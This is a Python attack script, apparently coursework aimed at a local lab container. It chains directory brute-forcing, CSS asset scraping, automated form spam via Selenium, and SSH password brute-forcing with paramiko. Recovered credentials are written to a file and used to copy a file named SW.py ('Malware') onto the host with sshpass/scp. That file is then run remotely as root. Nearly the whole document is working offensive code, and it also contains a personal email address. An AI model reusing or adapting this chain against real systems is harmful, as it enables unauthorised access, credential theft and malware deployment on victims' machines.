import queue
import threading
import os
import requests
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from bs4 import BeautifulSoup
from urllib import request
import urllib.request, urllib.error, urllib.parse
import re
from selenium import webdriver
import time
import paramiko
from collections import deque
import sys
import urllib3
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

#Spider
class MySpider():
    def __init__(self):
        pass
        
    def mygobuster(self,target):
        wordlist = [a.strip() for a in open("wordlist.txt")]
        filters = [".html",".css","jpg", "",".js",".md",".png"]
        html = open("html.txt", "a+") 
        for word in wordlist:
            for f in filters:
                url = target+word+f
                re = requests.head(url)

                if re.status_code==301 or re.status_code==401:
                    print("Directory found: ", re.url, re.status_code)
                    newurl = re.url+"/"
                    
                    self.mygobuster(newurl)

                elif re.status_code==200:
                    print("Found: ", re.url, re.status_code)
                    response = urllib.request.urlopen(url)
                    if ".html" in re.url:
                        html.write(re.url+"\n")
                    try:
                        Content = response.read().decode('utf-8')
                        f = open("found/"+str(re.url).replace("/",""), 'w+')
                        f.write(Content)
                        f.close()
                    except:
                        Content = response.read()
                        f = open("found/"+str(re.url).replace("/",""), 'wb+')
                        f.write(Content)
                        f.close()
                else:
                    continue

    def CSSbuster(self, target):
        r  = requests.get(" http://172.17.0.2:1337/stylesheet.css")
        data = r.text
        l = []
        for i in re.findall('url\(([^)]+)\)',data):
            l.append(i)
        s = [x[2:].strip('""') for x in l[:2]]
        for j in s:
            response = urllib.request.urlopen(target+j)
            if response.code==200:
                print("Picture found:", target+j)
                con = response.read()
                f = open("found/"+str(response.url).replace("/",""), 'wb+')
                f.write(con)
            else:
                pass
    
    
    def myBot(self):
        
        s=Service('/home/sleven/Studium/Sem5/Hacking-mit-Python/geckodriver')
        browser = webdriver.Firefox(service=s)
        for url in open("html.txt"):
            if url=="http://172.17.0.2:1337/biete.html\n":
                browser.get(url)
                eingabe = browser.find_element(By.ID,"ort")
                eingabe.send_keys("Salzburg")
                time.sleep(1)
                eingabe2 = browser.find_element(By.ID,"preis")
                eingabe2.send_keys("1500")
                time.sleep(1)
                eingabe2 = browser.find_element(By.ID,"zimmer")
                eingabe2.send_keys("5")
                time.sleep(1)
                eingabe3 = browser.find_element(By.ID,"flaeche")
                eingabe3.send_keys("500")
                time.sleep(1)
                eingabe4 = browser.find_element(By.ID,"kontakt")
                eingabe4.send_keys("Mori.r@web.de")
                time.sleep(1)

                ein = browser.find_element(By.ID,"saveimmoButton")
                ein.click()
                time.sleep(1)
            browser.get(url)
            time.sleep(1)

def attackssh(ip):
    try:
        global que
        if len(que)==0:
            print("Not found, maybe try a new wordlist?!")
            return 1
        print("Attacking ssh.....")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for line in range(len(que)):
            [username, password] = que.popleft().strip().split()
            try:
                print(f"Trying with {username} {password}")
                conn = ssh.connect(ip, username=username,password=password, banner_timeout=200)
                if conn is None:
                    print(username)
                    credentials = open("cred.txt", "r+")
                    credentials.write(username)
                    credentials.write(" ")
                    credentials.write(password)
                    print(f"Successfully Authenticated with {username} {password}")
                    break
            except paramiko.AuthenticationException:
                print("Failed!")
                continue
            
            except paramiko.SSHException:
                continue
                
    except NameError:
        que = deque()
        for word in open("sshwordlist.txt", "r").readlines():
            que.append(word)
        attackssh(ip)        
        
def getCredentials():
    #hole gefunde credentials aus datei
    cred = open('cred.txt','r').readlines()
    #case zu string
    cred_string = cred[0].split()
    #lese username und passwort aus
    global user, pw
    user = cred_string[0]
    pw = cred_string[1]
    


#send file to remote host
def sendMalware():
    getCredentials()
    print("Sending SW.py to victim....")
    ostring = "sshpass -p " + pw +  " scp -o StrictHostKeyChecking=no SW.py "+ user+"@172.17.0.2:/root"
    os.system(ostring)


#execute Malware
def ExecMalware():
    getCredentials()
    import paramiko
    import time

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('172.17.0.2', username=user, password=pw)

    time.sleep(1)
    stdin, stdout, stderr = client.exec_command('apt install sshpass')
    stdin, stdout, stderr = client.exec_command('python3 SW.py')


    for line in stdout:
        print(line)

    client.close()







def main(target):
    S = MySpider()
    print("Attacking target: ",target)
    time.sleep(1)
    print("starting Spyder attack @: ",target)
    time.sleep(1)
    S.mygobuster(target)
    time.sleep(1)
    print("crawlin css files..")
    time.sleep(1)
    S.CSSbuster(target)
    time.sleep(1)
    print("starting Selenium Bot attack @: ",target)
    time.sleep(1)
    S.myBot()
    time.sleep(1)
    print("start attacking ssh @: ",target)
    attackssh("172.17.0.2")
    time.sleep(2)
    print("Sending Malware....")
    time.sleep(2)
    getCredentials()
    sendMalware()
    time.sleep(1)
    print("Execute Malware")
    ExecMalware()

main("http://172.17.0.2:1337/")



